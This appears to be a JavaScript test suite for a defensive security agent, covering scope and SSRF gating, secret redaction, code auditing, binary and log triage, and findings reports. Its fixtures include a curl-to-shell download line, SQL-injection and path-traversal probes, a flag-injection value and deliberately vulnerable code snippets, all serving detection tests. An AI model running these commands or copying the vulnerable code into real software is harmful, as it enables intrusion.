const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs/promises');
const os = require('node:os');
const path = require('node:path');
const { EventEmitter } = require('node:events');
const { validateScopeConfig, assertTargetInScope, isPrivateOrReservedIp, redactSecrets } = require('../electron/cyber-scope.cjs');
const { prepareTool, executeTool } = require('../electron/agent-tools.cjs');
const { detectSecurityTools } = require('../electron/cyber-toolchain.cjs');
const { scanWorkspaceDna, reconcileWorkspaceFindings, buildWorkspaceGraphs } = require('../electron/cyber-analyzers.cjs');
const { createFindingsStore, toMarkdownReport, toSarifReport } = require('../electron/findings.cjs');
const { runAgent } = require('../electron/agent.cjs');

async function fixture(fn) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), 'benjamin-cyber-'));
  const root = path.join(dir, 'workspace'), backupDir = path.join(dir, 'backups'), findingsDir = path.join(dir, 'findings');
  await fs.mkdir(root);
  try { await fn({ dir, root, backupDir, findingsDir, signal: new AbortController().signal }); }
  finally { await fs.rm(dir, { recursive: true, force: true }); }
}

test('ScopeGate enforces hostnames, wildcards, ports, CIDRs, and SSRF/DNS-rebinding guards', async () => {
  assert.equal(isPrivateOrReservedIp('93.184.216.34'), false);
  for (const priv of ['127.0.0.1', '10.0.0.5', '172.16.4.1', '192.168.1.9', '169.254.169.254', '::1', '::ffff:127.0.0.1', 'fe80::1']) {
    assert.equal(isPrivateOrReservedIp(priv), true, `Expected ${priv} to be private/reserved`);
  }
  const scope = validateScopeConfig({ targets: ['api.example.com', '*.staging.example.com', 'https://portal.example.com:8443', '192.168.50.0/24'], allowOsv: true, redactContext: true });
  const publicDns = async () => [{ address: '93.184.216.34' }];

  const okHost = await assertTargetInScope('https://api.example.com/health', scope, { dnsLookup: publicDns, requireUrl: true });
  assert.equal(okHost.host, 'api.example.com');
  assert.deepEqual(okHost.addresses, ['93.184.216.34']);

  const okWildcard = await assertTargetInScope('auth.staging.example.com:443', scope, { dnsLookup: publicDns });
  assert.equal(okWildcard.host, 'auth.staging.example.com');

  const okCidr = await assertTargetInScope('192.168.50.25:8080', scope);
  assert.deepEqual(okCidr.addresses, ['192.168.50.25']);

  // Root of wildcard is not implicitly matched unless added.
  await assert.rejects(assertTargetInScope('staging.example.com', scope, { dnsLookup: publicDns }), /outside Authorized Scope/);
  // Wrong port on port-pinned URL rule.
  await assert.rejects(assertTargetInScope('https://portal.example.com:9443', scope, { dnsLookup: publicDns }), /outside Authorized Scope/);
  // Out-of-CIDR IP rejected.
  await assert.rejects(assertTargetInScope('192.168.51.25', scope), /outside Authorized Scope/);
  // Octal/integer IP tricks rejected.
  assert.throws(() => validateScopeConfig({ targets: ['0177.0.0.1'] }), /Invalid/);
  assert.throws(() => validateScopeConfig({ targets: ['https://user:pass@example.com'] }), /credentials/);

  // DNS rebinding to metadata / loopback blocked when IP not authorized.
  for (const rebound of ['127.0.0.1', '169.254.169.254', '10.1.2.3', '::ffff:127.0.0.1']) {
    await assert.rejects(
      assertTargetInScope('https://api.example.com', scope, { dnsLookup: async () => [{ address: rebound }] }),
      /SSRF \/ DNS-rebinding/
    );
  }
  // Explicitly authorized localhost / CIDR succeeds.
  const localScope = validateScopeConfig({ targets: ['localhost:3000'] });
  const okLocal = await assertTargetInScope('http://localhost:3000/status', localScope, { dnsLookup: async () => [{ address: '127.0.0.1' }], requireUrl: true });
  assert.deepEqual(okLocal.addresses, ['127.0.0.1']);
});

test('redactSecrets and scan_secrets detect credentials and never leak raw secrets', () => fixture(async f => {
  const gh = 'ghp_' + 'Z9y8X7w6V5u4T3s2R1q0P9o8N7m6L5k4J3i2';
  const aws = 'AKIAIOSFODNN7EXAMPLE';
  const sk = 'sk-proj-' + 'aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789';
  const raw = `export GITHUB_TOKEN="${gh}"\naws_key = "${aws}"\nAuthorization: Bearer ${sk}\n`;
  const redacted = redactSecrets(raw);
  assert.equal(redacted.count, 3);
  assert.ok(!redacted.text.includes(gh));
  assert.ok(!redacted.text.includes(aws));
  assert.ok(!redacted.text.includes(sk));

  await fs.mkdir(path.join(f.root, '.uv-cache/pkg'), { recursive: true });
  await fs.writeFile(path.join(f.root, '.uv-cache/pkg/cached.py'), `TOKEN = "${gh}"\n`);
  await fs.writeFile(path.join(f.root, 'docs.md'), 'Example URL: https://username:password@example.com\napi_key = "tutorial_value_1234"\nAuthorization: Bearer $COORDINATOR_TOKEN\n');
  await fs.writeFile(path.join(f.root, 'demo-local.sh'), 'curl -H "Authorization: Bearer demo-coordinator-token" http://127.0.0.1:8080\n');
  await fs.writeFile(path.join(f.root, 'config.js'), raw + 'const dsn = "postgres://prod_user:9fK2mP8xQ4vL@db.corp.internal:5432/app";\n');
  const plan = await prepareTool(f.root, 'scan_secrets', { path: '.' });
  assert.equal(plan.reason, '');
  const result = await executeTool(f.root, plan, f);
  assert.equal(result.findingsCount, 4);
  const serialized = JSON.stringify(result);
  assert.ok(!serialized.includes(gh));
  assert.ok(!serialized.includes(aws));
  assert.ok(!serialized.includes(sk));
  assert.ok(!serialized.includes('9fK2mP8xQ4vL'));
  assert.ok(!serialized.includes('.uv-cache'));
}));

test('audit_code_patterns and audit_dependencies inspect code sinks, SBOMs, and mocked OSV advisories', () => fixture(async f => {
  await fs.mkdir(path.join(f.root, 'src'));
  await fs.writeFile(path.join(f.root, 'src/vuln.js'), [
    'const { exec } = require("child_process");',
    'function run(user) { exec("ls " + user); }',
    'function query(db, id) { return db.query(`SELECT * FROM accounts WHERE id = ${id}`); }',
    'const agent = { rejectUnauthorized: false };'
  ].join('\n'));
  await fs.writeFile(path.join(f.root, 'Dockerfile'), 'FROM node:22\nUSER root\nRUN chmod 777 /app\n');

  const codeRes = await executeTool(f.root, await prepareTool(f.root, 'audit_code_patterns', { path: '.' }), f);
  const cwes = new Set(codeRes.matches.map(m => m.cwe));
  assert.ok(cwes.has('CWE-78'));
  assert.ok(cwes.has('CWE-89'));
  assert.ok(cwes.has('CWE-295'));
  assert.ok(cwes.has('CWE-250'));

  await fs.writeFile(path.join(f.root, 'package-lock.json'), JSON.stringify({
    lockfileVersion: 3,
    packages: {
      '': { name: 'demo', version: '1.0.0' },
      'node_modules/lodash': { version: '4.17.19' }
    }
  }));
  await fs.writeFile(path.join(f.root, 'requirements.txt'), 'requests==2.25.0\n');
  await fs.writeFile(path.join(f.root, 'Cargo.lock'), '[[package]]\nname = "tokio"\nversion = "1.35.0"\n');

  const depPlan = await prepareTool(f.root, 'audit_dependencies', { path: '.', query_osv: true });
  const depRes = await executeTool(f.root, depPlan, {
    ...f,
    scope: { targets: [], allowOsv: true, redactContext: true },
    fetchImpl: async (url, init) => {
      assert.equal(url, 'https://api.osv.dev/v1/querybatch');
      const body = JSON.parse(init.body);
      return new Response(JSON.stringify({
        results: body.queries.map(q => q.package.name === 'lodash' ? { vulns: [{ id: 'GHSA-p6mc-m468-83gw', aliases: ['CVE-2020-8203'], summary: 'Prototype pollution' }] } : {})
      }), { status: 200 });
    }
  });
  assert.equal(depRes.totalPackages, 3);
  assert.equal(depRes.sbom.bomFormat, 'CycloneDX');
  assert.equal(depRes.vulnerabilityCount, 1);
  assert.equal(depRes.vulnerabilities[0].id, 'GHSA-p6mc-m468-83gw');
}));

test('scope-locked HTTP, TLS, DNS, and TCP port tools enforce ScopeGate and evaluate security posture', () => fixture(async f => {
  const scope = { targets: ['secure.example.com', '198.51.100.10'], allowOsv: false, redactContext: true };
  const publicDns = async () => [{ address: '93.184.216.34' }];

  // Out-of-scope fails during prepareTool before any approval or socket is created.
  await assert.rejects(prepareTool(f.root, 'inspect_http_security', { url: 'https://unlisted.example.com' }, { scope }), /outside Authorized Scope/);

  const httpPlan = await prepareTool(f.root, 'inspect_http_security', { url: 'https://secure.example.com/login' }, { scope });
  assert.equal(httpPlan.reason, '');
  const httpRes = await executeTool(f.root, httpPlan, {
    ...f,
    scope,
    dnsLookup: publicDns,
    fetchImpl: async (_url, init) => {
      assert.equal(init.redirect, 'manual');
      return new Response('<html>login</html>', {
        status: 200,
        headers: {
          'access-control-allow-origin': '*',
          'access-control-allow-credentials': 'true',
          'set-cookie': 'sid=abc123; Path=/',
          server: 'nginx/1.18.0'
        }
      });
    }
  });
  assert.equal(httpRes.status, 200);
  assert.ok(httpRes.issues.some(i => i.cwe === 'CWE-942'));
  assert.ok(httpRes.issues.some(i => i.cwe === 'CWE-614'));

  // TLS inspection with simulated TLS socket
  const tlsPlan = await prepareTool(f.root, 'inspect_tls', { target: 'secure.example.com:443' }, { scope });
  const tlsRes = await executeTool(f.root, tlsPlan, {
    ...f,
    scope,
    dnsLookup: publicDns,
    tlsConnect: opts => {
      assert.equal(opts.host, '93.184.216.34');
      assert.equal(opts.servername, 'secure.example.com');
      const sock = new EventEmitter();
      sock.authorized = false;
      sock.authorizationError = 'DEPTH_ZERO_SELF_SIGNED_CERT';
      sock.getProtocol = () => 'TLSv1.1';
      sock.getCipher = () => ({ name: 'ECDHE-RSA-AES128-SHA', version: 'TLSv1/SSLv3' });
      sock.getPeerCertificate = () => ({ subject: { CN: 'secure.example.com' }, issuer: { CN: 'secure.example.com' }, valid_to: new Date(Date.now() + 5 * 86400000).toUTCString() });
      sock.destroy = () => {};
      queueMicrotask(() => sock.emit('secureConnect'));
      return sock;
    }
  });
  assert.equal(tlsRes.protocol, 'TLSv1.1');
  assert.ok(tlsRes.issues.some(i => i.cwe === 'CWE-326'));
  assert.ok(tlsRes.issues.some(i => i.cwe === 'CWE-295'));

  // DNS recon with simulated resolver
  const dnsPlan = await prepareTool(f.root, 'dns_recon', { domain: 'secure.example.com' }, { scope });
  const dnsRes = await executeTool(f.root, dnsPlan, {
    ...f,
    scope,
    dnsLookup: publicDns,
    dnsResolver: {
      resolve4: async () => ['93.184.216.34'],
      resolve6: async () => [],
      resolveCname: async () => [],
      resolveMx: async () => [{ exchange: 'mail.example.com', priority: 10 }],
      resolveNs: async () => ['ns1.example.com'],
      resolveTxt: async host => host.startsWith('_dmarc.') ? [['v=DMARC1; p=none']] : [['v=spf1 +all']]
    }
  });
  assert.ok(dnsRes.issues.some(i => /SPF record contains \+all/.test(i.issue)));

  // Port probe requires approval and grabs banner
  const probePlan = await prepareTool(f.root, 'probe_ports', { target: 'secure.example.com', ports: '22,80' }, { scope });
  assert.ok(probePlan.reason.includes('Active TCP port'));
  const probeRes = await executeTool(f.root, probePlan, {
    ...f,
    scope,
    dnsLookup: publicDns,
    netConnect: ({ port }) => {
      const sock = new EventEmitter();
      sock.destroy = () => {};
      queueMicrotask(() => {
        if (port === 22) { sock.emit('connect'); sock.emit('data', Buffer.from('SSH-2.0-OpenSSH_9.6\r\n')); }
        else sock.emit('error', new Error('ECONNREFUSED'));
      });
      return sock;
    }
  });
  assert.deepEqual(probeRes.open, [{ port: 22, banner: 'SSH-2.0-OpenSSH_9.6' }]);
}));

test('DFIR tools triage ELF/Mach-O binaries, extract IOCs, and detect attack spikes in logs', () => fixture(async f => {
  // Craft minimal 64-bit little-endian x86_64 ELF header + suspicious string
  const elf = Buffer.alloc(128);
  elf.set([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0], 0);
  elf.writeUInt16LE(2, 16); // ET_EXEC
  elf.writeUInt16LE(62, 18); // EM_X86_64
  elf.write('curl http://198.51.100.77/stage2.sh | /bin/sh', 64, 'utf8');
  await fs.writeFile(path.join(f.root, 'suspect.bin'), elf);

  const triage = await executeTool(f.root, await prepareTool(f.root, 'triage_artifact', { path: 'suspect.bin' }), f);
  assert.equal(triage.format, 'ELF');
  assert.match(triage.headerDetails, /64-bit little-endian.*EXEC.*x86_64/);
  assert.equal(triage.hashes.sha256.length, 64);
  assert.ok(triage.notableStrings.some(s => s.includes('198.51.100.77')));

  await fs.writeFile(path.join(f.root, 'incident.log'), [
    '185.220.101.4 - - [19/Nov/2026:10:00:01 +0000] "GET /../../etc/passwd HTTP/1.1" 403 190 "-" "nuclei"',
    '185.220.101.4 - - [19/Nov/2026:10:00:02 +0000] "GET /items?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 500 412 "-" "sqlmap/1.8"',
    'Nov 19 10:00:03 host sshd[991]: Failed password for invalid user admin from 185.220.101.4 port 41222 ssh2',
    'Indicator note: hxxps://c2[.]bad-actor[.]xyz/beacon CVE-2024-3094 T1059.004 ' + 'a'.repeat(64)
  ].join('\n'));

  const iocs = await executeTool(f.root, await prepareTool(f.root, 'extract_iocs', { path: 'incident.log' }), f);
  assert.ok(iocs.iocs.externalIpv4.includes('185.220.101.4'));
  assert.ok(iocs.iocs.urls.includes('https://c2.bad-actor.xyz/beacon'));
  assert.ok(iocs.iocs.cves.includes('CVE-2024-3094'));
  assert.ok(iocs.iocs.mitreTechniques.includes('T1059.004'));

  const logs = await executeTool(f.root, await prepareTool(f.root, 'analyze_logs', { path: 'incident.log' }), f);
  assert.ok(logs.signatureCounts['path-traversal'] >= 1);
  assert.ok(logs.signatureCounts['sqli-probe'] >= 1);
  assert.ok(logs.signatureCounts['auth-failure'] >= 1);
  assert.equal(logs.topSourceIps[0].ip, '185.220.101.4');
}));

test('Toolchain Doctor ignores workspace binaries and executes external scanners without shell interpolation', () => fixture(async f => {
  // Drop a rogue binary inside the workspace: must NEVER be trusted.
  await fs.writeFile(path.join(f.root, 'semgrep'), '#!/bin/sh\necho PWNED\n', { mode: 0o755 });
  const trustedBin = path.join(f.dir, 'trusted-bin');
  await fs.mkdir(trustedBin);
  await fs.writeFile(path.join(trustedBin, 'semgrep'), '#!/bin/sh\nif [ "$1" = "--version" ]; then echo "1.99.0"; exit 0; fi\nprintf \'{"results":[{"check_id":"js.sqli","path":"app.js","start":{"line":9},"extra":{"severity":"ERROR","message":"SQLi found"}},{"check_id":"js.sqli","path":"app.js","start":{"line":19},"extra":{"severity":"ERROR","message":"SQLi found"}},{"check_id":"yaml.github-actions.security.third-party-action-not-pinned-to-commit-sha","path":".github/workflows/ci.yml","start":{"line":20},"extra":{"severity":"ERROR","message":"Mutable tag"}}]}\'\n', { mode: 0o755 });

  const doctorFromWorkspace = await detectSecurityTools(f.root, { root: f.root });
  assert.equal(doctorFromWorkspace.tools.find(t => t.id === 'semgrep').available, false);

  const doctorTrusted = await detectSecurityTools(trustedBin, { root: f.root });
  const semgrepInfo = doctorTrusted.tools.find(t => t.id === 'semgrep');
  assert.equal(semgrepInfo.available, true);
  assert.equal(semgrepInfo.version, '1.99.0');

  // Target starting with "-" is rejected to block flag injection.
  await assert.rejects(prepareTool(f.root, 'run_security_scanner', { scanner: 'semgrep', target: '--config=/etc/passwd' }), /cannot start with "-"/);

  const scanPlan = await prepareTool(f.root, 'run_security_scanner', { scanner: 'semgrep', target: '.', profile: 'owasp-top-ten' });
  assert.ok(scanPlan.reason.includes('External security CLI'));
  const scanRes = await executeTool(f.root, scanPlan, { ...f, commandPath: `${trustedBin}:/usr/bin:/bin` });
  assert.equal(scanRes.exitCode, 0);
  assert.equal(scanRes.structuredFindingsCount, 1);
  assert.equal(scanRes.structuredFindings[0].rule, 'js.sqli');
}));

test('Findings Ledger deduplicates entries, exports Markdown & SARIF v2.1.0, and works in appsec playbook runs', () => fixture(async f => {
  const store = createFindingsStore(f.findingsDir);
  let step = 0;
  const sse = obj => new Response(`data: ${JSON.stringify(obj)}\n\ndata: [DONE]\n`);
  await runAgent({
    ...f,
    id: 'cyber-run',
    playbook: 'appsec',
    findingsStore: store,
    settings: { baseUrl: 'https://fixture.invalid/v1', model: 'sec-model' },
    apiKey: '',
    messages: [{ role: 'user', content: 'Audit auth.js' }],
    context: '',
    onToken() {},
    onEvent() {},
    audit: async () => {},
    approve: async () => false,
    fetchImpl: async () => {
      if (step++ === 0) {
        return sse({ choices: [{ delta: { tool_calls: [{ index: 0, id: 'c1', type: 'function', function: { name: 'record_finding', arguments: JSON.stringify({ title: 'Command Injection in deploy helper', severity: 'critical', category: 'appsec', cwe: 'CWE-78', mitre: 'T1059', cvss: 9.8, location: 'scripts/deploy.js:18', evidence: 'exec(req.query.branch)', remediation: 'Use execFile with fixed argument array.' }) } }] }, finish_reason: 'tool_calls' }] });
      }
      return sse({ choices: [{ delta: { content: 'Recorded 1 critical finding.' }, finish_reason: 'stop' }] });
    }
  });

  // Duplicate record updates existing rather than duplicating
  await store.record(f.root, { title: 'Command Injection in deploy helper', severity: 'critical', category: 'appsec', cwe: 'CWE-78', location: 'scripts/deploy.js:18', evidence: 'Updated evidence', remediation: 'Use execFile.' });
  const list = await store.list(f.root);
  assert.equal(list.length, 1);
  assert.equal(list[0].evidence, 'Updated evidence');

  const md = toMarkdownReport({ workspace: f.root, scope: { targets: ['api.example.com'] }, findings: list });
  assert.match(md, /Command Injection in deploy helper/);
  assert.match(md, /CWE-78/);

  const sarif = toSarifReport({ workspace: f.root, findings: list });
  assert.equal(sarif.version, '2.1.0');
  assert.equal(sarif.runs[0].results[0].ruleId, 'CWE-78');
  assert.equal(sarif.runs[0].results[0].locations[0].physicalLocation.artifactLocation.uri, 'scripts/deploy.js');
  assert.equal(sarif.runs[0].results[0].locations[0].physicalLocation.region.startLine, 18);
}));

test('record_findings batches multiple findings in one step, and step-budget exhaustion synthesizes an interim report with paused=true', () => fixture(async f => {
  const store = createFindingsStore(f.findingsDir);
  const batchPlan = await prepareTool(f.root, 'record_findings', {
    findings: [
      { title: 'SQLi in query', severity: 'high', category: 'appsec', cwe: 'CWE-89', location: 'src/db.js:12', evidence: 'db.query(raw)', remediation: 'Use parameterized query.' },
      { title: 'Weak MD5 hash', severity: 'medium', category: 'appsec', cwe: 'CWE-328', location: 'src/auth.js:4', evidence: 'createHash("md5")', remediation: 'Use Argon2id or bcrypt.' }
    ]
  });
  const batchRes = await executeTool(f.root, batchPlan, { ...f, findingsStore: store, playbook: 'appsec', runId: 'batch-1' });
  assert.equal(batchRes.recordedCount, 2);
  assert.equal((await store.list(f.root)).length, 2);

  // Verify step-budget exhaustion synthesizes a final report instead of throwing an error.
  let calls = 0;
  const auditEvents = [];
  const sse = obj => new Response(`data: ${JSON.stringify(obj)}\n\ndata: [DONE]\n`);
  const res = await runAgent({
    ...f,
    id: 'budget-run',
    playbook: 'general', // maxRounds = 24
    findingsStore: store,
    settings: { baseUrl: 'https://fixture.invalid/v1', model: 'sec-model' },
    apiKey: '',
    messages: [{ role: 'user', content: 'Audit everything' }],
    context: '',
    onToken() {},
    onEvent() {},
    audit: async ev => { auditEvents.push(ev); },
    approve: async () => false,
    fetchImpl: async (_url, init) => {
      const parsed = JSON.parse(init.body);
      calls++;
      if (!parsed.tools) {
        return sse({ choices: [{ delta: { content: 'Interim summary: 2 findings verified so far; click Continue for remaining checks.' }, finish_reason: 'stop' }] });
      }
      return sse({ choices: [{ delta: { tool_calls: [{ index: 0, id: `call-${calls}`, type: 'function', function: { name: 'find_files', arguments: JSON.stringify({ path: '.', pattern: `*.part${calls}` }) } }] }, finish_reason: 'tool_calls' }] });
    }
  });
  assert.equal(res.paused, true);
  assert.match(res.pauseReason, /Paused after 24 steps/);
  assert.match(res.content, /Interim summary/);
  assert.ok(auditEvents.some(e => e.status === 'paused-at-limit'));

  // Verify identical failing tool calls are short-circuited by the loop guard without spamming UI cards,
  // and mid-run HTTP 500 context-overflow errors automatically compact and retry.
  const emittedCards = [];
  let loopCalls = 0;
  let injected500 = false;
  const loopRes = await runAgent({
    ...f,
    id: 'loop-guard-run',
    playbook: 'dfir',
    settings: { baseUrl: 'https://fixture.invalid/v1', model: 'small-8b' },
    apiKey: '',
    messages: [{ role: 'user', content: 'Triage missing log' }],
    context: '',
    onToken() {},
    onEvent: ev => { if (ev.actionId && ev.status === 'error') emittedCards.push(ev); },
    audit: async () => {},
    approve: async () => false,
    fetchImpl: async (_url, init) => {
      const parsed = JSON.parse(init.body);
      if (loopCalls === 1 && !injected500) {
        injected500 = true;
        return new Response('llama runner process has terminated: kv cache out of memory', { status: 500 });
      }
      loopCalls++;
      if (!parsed.tools) {
        return sse({ choices: [{ delta: { content: 'Stopped retrying missing file; summary complete.' }, finish_reason: 'stop' }] });
      }
      return sse({ choices: [{ delta: { tool_calls: [{ index: 0, id: `dup-${loopCalls}`, type: 'function', function: { name: 'triage_artifact', arguments: JSON.stringify({ path: 'missing/ghost.log' }) } }] }, finish_reason: 'tool_calls' }] });
    }
  });
  assert.equal(injected500, true);
  assert.equal(emittedCards.length, 1); // Only 1 error card shown in UI!
  assert.equal(loopCalls, 5); // 1 real failure + 3 blocked duplicates + 1 synthesis
  assert.match(loopRes.content, /Stopped retrying missing file/);
}));

test('scanWorkspaceDna maps Shannon byte entropy, skips symlinks & protected dotfiles, and joins CLI + finding posture', () => fixture(async f => {
  await fs.mkdir(path.join(f.root, 'src'), { recursive: true });
  await fs.mkdir(path.join(f.root, 'artifacts'), { recursive: true });
  await fs.writeFile(path.join(f.root, 'src/router.js'), 'export function route(req) {\n  return { ok: true, path: req.url };\n}\n'.repeat(8));
  await fs.writeFile(path.join(f.root, 'package.json'), JSON.stringify({ name: 'demo', dependencies: { express: '4.19.2' } }, null, 2));
  await fs.writeFile(path.join(f.root, '.env'), 'SECRET=never_read_me\n');

  // Deterministic 4 KB full-byte-spectrum buffer (~8.00 bits/byte)
  const highEntropy = Buffer.alloc(4096, (_, i) => i & 0xff);
  for (let i = 0; i < 4096; i++) highEntropy[i] = (i * 73 + 19) & 0xff;
  await fs.writeFile(path.join(f.root, 'artifacts/packed.bin'), highEntropy);
  await fs.symlink(path.join(f.root, 'src/router.js'), path.join(f.root, 'src/link.js'));

  const dna = await scanWorkspaceDna(f.root, {
    findings: [
      { id: 'f1', title: 'Open Redirect in router', severity: 'high', cwe: 'CWE-601', status: 'open', location: 'src/router.js:2' }
    ],
    tools: [
      { id: 'semgrep', label: 'Semgrep', available: true },
      { id: 'gitleaks', label: 'Gitleaks', available: true },
      { id: 'radare2', label: 'Radare2', available: true },
      { id: 'otool', label: 'macOS otool', available: false }
    ]
  });

  assert.equal(dna.summary.totalFiles, 3); // .env and symlink excluded
  assert.equal(dna.summary.readyCount, 3);
  assert.ok(dna.summary.hotspotCount >= 2); // high-severity finding + packed binary >= 7.2 b/B

  const router = dna.files.find(x => x.path === 'src/router.js');
  const packed = dna.files.find(x => x.path === 'artifacts/packed.bin');
  assert.ok(router.entropy > 3.0 && router.entropy < 5.5);
  assert.equal(router.maxSeverity, 'high');
  assert.deepEqual(router.engines, ['semgrep', 'gitleaks']);

  assert.ok(packed.entropy > 7.8);
  assert.equal(packed.kind, 'binary');
  assert.deepEqual(packed.engines, ['radare2']);

  // Verify fixing a vulnerable file + rescanning DNA auto-mitigates stale open findings -> clean green node
  const store = createFindingsStore(f.findingsDir);
  await fs.writeFile(path.join(f.root, 'src/widget.js'), 'export function render(el, userHtml) {\n  el.innerHTML = userHtml;\n}\n');
  await store.record(f.root, {
    title: 'DOM XSS in widget renderer',
    severity: 'medium',
    category: 'appsec',
    cwe: 'CWE-79',
    location: 'src/widget.js:2',
    evidence: 'el.innerHTML = userHtml;',
    remediation: 'Assign el.textContent instead of innerHTML.'
  });

  // Before fix: finding stays open (yellow medium warning node)
  const beforeFix = await reconcileWorkspaceFindings(f.root, store);
  assert.equal(beforeFix.mitigatedCount, 0);
  const dnaBefore = await scanWorkspaceDna(f.root, { findings: beforeFix.findings, tools: [] });
  assert.equal(dnaBefore.files.find(x => x.path === 'src/widget.js').maxSeverity, 'medium');

  // Fix file to use textContent -> Rescan reconciles finding to mitigated and clears node to clean
  await fs.writeFile(path.join(f.root, 'src/widget.js'), 'export function render(el, userHtml) {\n  el.textContent = userHtml;\n}\n');
  const afterFix = await reconcileWorkspaceFindings(f.root, store);
  assert.equal(afterFix.mitigatedCount, 1);
  assert.equal(afterFix.findings[0].status, 'mitigated');
  const dnaAfter = await scanWorkspaceDna(f.root, { findings: afterFix.findings, tools: [] });
  const widgetAfter = dnaAfter.files.find(x => x.path === 'src/widget.js');
  assert.equal(widgetAfter.findingCount, 0);
  assert.equal(widgetAfter.maxSeverity, '');
  assert.equal(dnaAfter.summary.openFindingsCount, 0);
  assert.equal(toSarifReport({ workspace: f.root, findings: afterFix.findings }).runs[0].results.length, 0);

  // Verify 9-CLI Convergence + Attack Reachability graph builder maps engines, scope, active & severed paths
  await store.record(f.root, {
    title: 'SQLi in query handler',
    severity: 'high',
    category: 'appsec',
    cwe: 'CWE-89',
    location: 'src/router.js:2',
    evidence: 'req.url',
    remediation: 'Parameterize query.'
  });
  const graphs = await buildWorkspaceGraphs(f.root, {
    findings: await store.list(f.root),
    tools: [{ id: 'semgrep', label: 'Semgrep', available: true }, { id: 'nmap', label: 'Nmap', available: true }],
    scope: { targets: ['api.example.com'] }
  });
  assert.equal(graphs.convergence.engines.length, 9);
  assert.ok(graphs.convergence.assets.some(a => a.kind === 'scope' && a.path === 'api.example.com'));
  assert.ok(graphs.reachability.lanes.some(l => l.state === 'severed'));
  assert.ok(graphs.reachability.lanes.some(l => l.path === 'src/router.js'));
}));
